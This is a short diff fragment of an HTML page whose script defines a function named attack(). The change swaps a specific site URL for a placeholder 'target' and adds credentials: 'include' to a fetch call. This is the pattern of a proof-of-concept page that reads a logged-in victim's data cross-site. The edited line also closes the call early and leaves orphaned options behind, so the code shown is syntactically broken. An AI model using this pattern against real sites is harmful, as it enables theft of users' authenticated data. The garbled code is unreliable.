@@ -11,7 +11,7 @@
 
   <script>
     function attack() {
-      fetch("https://www.principal.com/", {
+    fetch("https://target", { credentials: "include" })
         method: "GET",
       })
       .then(res => res.text())
